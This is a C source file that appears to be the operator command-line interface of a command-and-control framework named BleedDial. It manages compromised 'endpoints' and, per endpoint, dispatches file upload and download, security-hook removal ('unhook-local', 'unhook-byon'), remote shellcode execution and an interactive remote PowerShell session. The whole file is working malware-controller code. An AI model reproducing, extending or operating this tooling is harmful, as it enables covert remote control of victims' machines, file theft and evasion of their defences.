#pragma once

#include<stdio.h>
#include<string.h>
#include<ctype.h>

#define WIN32_LEAN_AND_MEAN
#include<Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

#include "../transport/transport.h"
#include "../endpoint/endpoint.h"
#include "../jobs/jobs.h"
#include "../common.h"

#include "cli.h"

void _print_prompt(struct cli_info_t* cli_info,
				   struct bleeddial_ctx_t* ctx) {
	if (cli_info->cli_state == TOP) {
		printf("BleedDial#");
	}
	else {
		char endpoint_alias[ALIAS_MAX_LEN];
		int res = 0;

		EnterCriticalSection(&ctx->endpoint_db_cs);
		res = endpoint_id_alias(
			endpoint_alias,
			sizeof(endpoint_alias),
			cli_info->endpoint_id,
			ctx->endpoint_db
		);
		LeaveCriticalSection(&ctx->endpoint_db_cs);

		if (res == -1) printf("(%d)#", cli_info->endpoint_id);
		else printf("(%d-%s)#", cli_info->endpoint_id, endpoint_alias);
	}
}

#define PATH_FROM 0
#define PATH_TO   1

int _from_to_paths(char* input, char from_to_tuple[2][255]) {
	memset(from_to_tuple, 0, sizeof(char[2][255]));

	char* tok;
	char* file_name_ptr;
	char* context = NULL;

	if (from_to_tuple == 0) return -1; //couldn't allocate

	tok = strtok_s(input, " \n", &context);
	if (!strchr(tok, '/')) {
		strncpy_s(from_to_tuple[PATH_FROM], 255, "./", _TRUNCATE);
		strncat_s(from_to_tuple[PATH_FROM], 255, tok, _TRUNCATE);
	}
	else {
		strncpy_s(from_to_tuple[PATH_FROM], 255, tok, _TRUNCATE);
	}

	file_name_ptr = PathFindFileNameA(from_to_tuple[PATH_FROM]);
	if (strlen(file_name_ptr) == strlen(from_to_tuple[PATH_FROM])
		&& strchr(from_to_tuple[PATH_FROM], '/'))
		return -2; //no file specified

	tok = strtok_s(NULL, " \n", &context);
	if (tok == NULL) {
		strncpy_s(from_to_tuple[PATH_TO], 255, "./", _TRUNCATE);
		strncat_s(from_to_tuple[PATH_TO], 255,
			file_name_ptr, 255 - strlen(from_to_tuple[PATH_TO]));
		return 0;
	}
	strncpy_s(from_to_tuple[PATH_TO], 255, tok, _TRUNCATE);

	if (from_to_tuple[PATH_TO][0] == '.')
		strncat_s(from_to_tuple[PATH_TO], 255, "/", _TRUNCATE);

	size_t dst_len = strlen(from_to_tuple[PATH_TO]);
	if (from_to_tuple[PATH_TO][dst_len - 1] == '/')
		strncat_s(from_to_tuple[PATH_TO], 255,
			file_name_ptr, 255 - strlen(from_to_tuple[PATH_TO]));

	return 0;
}


int _handle_list_e(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {
	EnterCriticalSection(&ctx->endpoint_db_cs);

	char connect_msg[] = "Connected";
	char notconnect_msg[] = "Not Connected";
	char* msg_ptr;

	char alias_buf[ALIAS_MAX_LEN];
	int res = -1;
	for (int i = 0; i < MAX_ENDPOINTS; i++) {
		if (endpoint_exists(i, ctx->endpoint_db) == -1) continue;
		res = endpoint_id_alias(alias_buf,
			sizeof(alias_buf),
			i,
			ctx->endpoint_db);
		if (res == -1) {
			msg_ptr =
				endpoint_connected(i, ctx->endpoint_db) == -1 ?
				notconnect_msg :
				connect_msg;
			printf("%d status: %s\n", i, msg_ptr);
		}
		else {
			msg_ptr =
				endpoint_connected(i, ctx->endpoint_db) == -1 ?
				notconnect_msg :
				connect_msg;
			printf("%s (%d) status: %s\n",
				alias_buf,
				i,
				msg_ptr);
		}
	}
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
}

int _handle_show_nexus_key(char* user_input,
						   char** tok_ctx_ptr,
						   struct cli_info_t* cli_info,
						   struct bleeddial_ctx_t* ctx) {
	
	size_t key_len;
	char* key_ptr;
	int has_key = 0;

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	has_key = tremont_getkey_nexus(&key_ptr, &key_len, nexus);

	if (has_key == -1) {
		printf("Nexus is not keyed.\n");
		return 0;
	}

	for (int i = 0; i < key_len; i++) {
		printf("\\x%02X", key_ptr[i]);
		if (i == 0) continue;
		if (i % 7 == 0) printf("\n");
	}
	return 0;
}


int _handle_print_nexus_key(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	size_t key_len;
	char* key_ptr;
	int has_key = 0;

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	has_key = tremont_getkey_nexus(&key_ptr, &key_len, nexus);
	printf("Nexus key:\n%s\n", key_ptr);
	return 0;
}


int _handle_alias(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {
	EnterCriticalSection(&ctx->endpoint_db_cs);
	char* second_word;
	endpoint_id_t id = 0;

	second_word = strtok_s(NULL, " ", tok_ctx_ptr);
	if (strncmp(second_word, "set", 3) == 0) {
		size_t alias_len = 0;
		char* alias;
		char* end;
		errno = 0;

		id = strtol(*tok_ctx_ptr, &end, 10);
		if (errno != 0) goto UNKNOWN;
		alias = strtok_s(NULL, " \n", &end);
		alias_len = strlen(alias);

		endpoint_alias_set(alias, alias_len, id, ctx->endpoint_db);
		LeaveCriticalSection(&ctx->endpoint_db_cs);
		return 0;
	}
	if (strncmp(second_word, "reset", 5) == 0) {
		char* end;
		errno = 0;

		id = strtol(*tok_ctx_ptr, &end, 10);
		if (errno != 0) goto UNKNOWN;

		endpoint_alias_reset(id, ctx->endpoint_db);
		LeaveCriticalSection(&ctx->endpoint_db_cs);
		return 0;
	}
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return -1;
UNKNOWN:
	printf("Unknown endpoint\n");
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
}

int _handle_register(char* user_input,
					 char** tok_ctx_ptr,
					 struct cli_info_t* cli_info,
				 	 struct bleeddial_ctx_t* ctx) {
	
	EnterCriticalSection(&ctx->endpoint_db_cs);
	errno = 0;
	char* end;
	
	char* id_str;
	endpoint_id_t id = 0;

	id_str = strtok_s(NULL, " ", tok_ctx_ptr);
	if (!id_str) goto UNKNOWN;

	id = strtol(id_str, &end, 10);
	if (errno != 0) goto UNKNOWN;

	char* ctrl_stream_str;
	tremont_stream_id ctrl_stream;

	ctrl_stream_str = strtok_s(NULL, " \n", tok_ctx_ptr);
	if (!id_str) goto UNKNOWN;

	ctrl_stream = strtol(ctrl_stream_str, &end, 10);
	if (errno != 0) goto UNKNOWN;

	endpoint_register(id, ctrl_stream, ctx);
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
UNKNOWN:
	printf("Unknown endpoint\n");
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
}

int _handle_unregister(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	EnterCriticalSection(&ctx->endpoint_db_cs);
	errno = 0;
	char* end;

	char* id_str;
	endpoint_id_t id = 0;

	id_str = strtok_s(NULL, " \n", tok_ctx_ptr);
	if (!id_str) goto UNKNOWN;

	id = strtol(id_str, &end, 10);
	if (errno != 0) goto UNKNOWN;

	endpoint_unregister(id, ctx);
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
UNKNOWN:
	printf("Unknown endpoint\n");
	LeaveCriticalSection(&ctx->endpoint_db_cs);
	return 0;
}


int _handle_tone(char* user_input, 
		         char** tok_ctx_ptr, 
				 struct cli_info_t* cli_info,
				 struct bleeddial_ctx_t* ctx) {
	EnterCriticalSection(&ctx->endpoint_db_cs);

	char* second_word;
	endpoint_id_t id;

	second_word = strtok_s(NULL, " \n", tok_ctx_ptr);
	if (isalpha(second_word[0])) {
		size_t alias_len = strlen(second_word);

		int res = 0;
		res = endpoint_alias_id(
			second_word,
			alias_len,
			&id,
			ctx->endpoint_db
		);

		if (res == -1) goto UNKNOWN;
		if (endpoint_exists(id, ctx->endpoint_db) == -1)
			goto UNKNOWN;

		goto GOOD_ENDPOINT;
	}
	else {
		errno = 0;
		char* end;

		id = strtol(second_word, &end, 10);
		if (endpoint_exists(id, ctx->endpoint_db) == -1)
			goto UNKNOWN;

		goto GOOD_ENDPOINT;
	}
GOOD_ENDPOINT:
	cli_info->cli_state = TONE;
	cli_info->endpoint_id = id;

	LeaveCriticalSection(&ctx->endpoint_db_cs);
	
	return 0;
UNKNOWN:
	printf("Unknown endpoint\n");

	LeaveCriticalSection(&ctx->endpoint_db_cs);

	return 0;
}

int _handle_upload(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	char from_to_tuple[2][255];

	int res = _from_to_paths(*tok_ctx_ptr, from_to_tuple);
	if (res == -2) {
		printf("No file specified!\n");
		return 0;
	}

	struct upload_params_t* params;
	params = calloc(1, sizeof(*params));
	if (params == 0) return -1;

	params->ctx = ctx;
	params->endpoint_id = cli_info->endpoint_id;

	strncpy_s(params->local_path,
		255,
		from_to_tuple[PATH_FROM],
		_TRUNCATE
	);
	params->local_path_len = strlen(from_to_tuple[PATH_FROM]);

	strncpy_s(params->remote_path,
		255,
		from_to_tuple[PATH_TO],
		_TRUNCATE
	);
	params->remote_path_len = strlen(from_to_tuple[PATH_TO]);

	CreateThread(NULL, 0, thread_upload, params, 0, 0);

	return 0;
}

int _handle_download(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	char from_to_tuple[2][255];

	int res = _from_to_paths(*tok_ctx_ptr, from_to_tuple);
	if (res == -2) {
		printf("No file specified!\n");
		return 0;
	}

	struct download_params_t* params;
	params = calloc(1, sizeof(*params));
	if (params == 0) return -1;

	params->ctx = ctx;
	params->endpoint_id = cli_info->endpoint_id;

	strncpy_s(params->local_path,
		255,
		from_to_tuple[PATH_TO],
		_TRUNCATE
	);
	params->local_path_len = strlen(from_to_tuple[PATH_TO]);

	strncpy_s(params->remote_path,
		255,
		from_to_tuple[PATH_FROM],
		_TRUNCATE
	);
	params->remote_path_len = strlen(from_to_tuple[PATH_FROM]);

	CreateThread(NULL, 0, thread_download, params, 0, 0);

	return 0;
}

int _handle_unhook_local(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	struct unhookl_params_t* params;
	params = calloc(1, sizeof(*params));
	if (params == 0) return -1;

	params->ctx = ctx;
	params->endpoint_id = cli_info->endpoint_id;

	CreateThread(NULL, 0, thread_unhookl, params, 0, 0);

	return 0;
}

int _handle_unhook_byon(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	char from_to_tuple[2][255];

	int res = _from_to_paths(*tok_ctx_ptr, from_to_tuple);
	if (res == -2) {
		printf("No file specified!\n");
		return 0;
	}

	struct unhookbyon_params_t* params;
	params = calloc(1, sizeof(*params));
	if (params == 0) return -1;

	params->ctx = ctx;
	params->endpoint_id = cli_info->endpoint_id;

	strncpy_s(params->local_path,
		255,
		from_to_tuple[PATH_FROM],
		_TRUNCATE
	);
	params->local_path_len = strlen(from_to_tuple[PATH_FROM]);

	CreateThread(NULL, 0, thread_unhookbyon, params, 0, 0);

	return 0;
}

int _handle_run_shellcode(char* user_input,
	char** tok_ctx_ptr,
	struct cli_info_t* cli_info,
	struct bleeddial_ctx_t* ctx) {

	char from_to_tuple[2][255];

	int res = _from_to_paths(*tok_ctx_ptr, from_to_tuple);
	if (res == -2) {
		printf("No file specified!\n");
		return 0;
	}

	struct runcode_params_t* params;
	params = calloc(1, sizeof(*params));
	if (params == 0) return -1;

	params->ctx = ctx;
	params->endpoint_id = cli_info->endpoint_id;

	strncpy_s(params->local_path,
		255,
		from_to_tuple[PATH_FROM],
		_TRUNCATE
	);
	params->local_path_len = strlen(from_to_tuple[PATH_FROM]);

	CreateThread(NULL, 0, thread_runcode, params, 0, 0);

	return 0;
}

int _handle_user_input(char* user_input, 
					   size_t user_input_len, 
					   struct cli_info_t* cli_info,
				       struct bleeddial_ctx_t* ctx) {

	char* tok_ctx = 0;
	char* first_word;
	
	if (user_input[0] == '\n') return 0;
	first_word = strtok_s(user_input, " ", &tok_ctx);
	
	if (cli_info->cli_state == TOP) {
		if (strncmp(first_word, "tone", 4) == 0) {
			return _handle_tone(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "alias", 5) == 0) {
			return _handle_alias(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "show-nexus-key", 15) == 0) {
			return _handle_show_nexus_key(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "print-nexus-key", 15) == 0) {
			return _handle_print_nexus_key(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "list-endpoints", 14) == 0) {
			return _handle_list_e(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "register-endpoint", 17) == 0) {
			return _handle_register(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "unregister-endpoint", 19) == 0) {
			return _handle_unregister(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "exit", 4) == 0) {
			return -1;
		}
	}
	if (cli_info->cli_state == TONE) {
		if (strncmp(first_word, "upload", 8) == 0) {
			return _handle_upload(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "download", 8) == 0) {
			return _handle_download(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "unhook-local", 12) == 0) {
			return _handle_unhook_local(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "unhook-byon", 11) == 0) {
			return _handle_unhook_byon(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "run-shellcode", 11) == 0) {
			return _handle_run_shellcode(user_input, &tok_ctx, cli_info, ctx);
		}
		if (strncmp(first_word, "powershell", 10) == 0) {
			struct powershell_params_t* p = calloc(1, sizeof(*p));
			if (p == 0) return -1;
			p->ctx = ctx;
			p->endpoint_id = cli_info->endpoint_id;
			
			cli_info->cli_state = GUEST;
			cli_info->guest_shell = sync_powershell;
			cli_info->guest_shell_params = p;

			return 0;
		}
		if (strncmp(first_word, "exit", 4) == 0) {
			cli_info->cli_state = TOP;
			cli_info->endpoint_id = 0;
			return 0;
		}
	}
	printf("Unkown command\n");
	return 0;
}

int cli_main(struct bleeddial_ctx_t* ctx) {
	struct cli_info_t cli_info;
	cli_info.cli_state = TOP;
	ctx->cli_info = &cli_info;

	char user_input[255];
	size_t user_input_len = 0;
	int res = 0;

	while (res != -1) {
		if (cli_info.cli_state == GUEST) 
			cli_info.guest_shell(cli_info.guest_shell_params);
		
		_print_prompt(&cli_info, ctx);
		fgets(user_input, sizeof(user_input), stdin);
		
		user_input_len = strlen(user_input);
		res = _handle_user_input(user_input, 
								 user_input_len, 
								 &cli_info,
								 ctx
		);
	}

	return 0;
}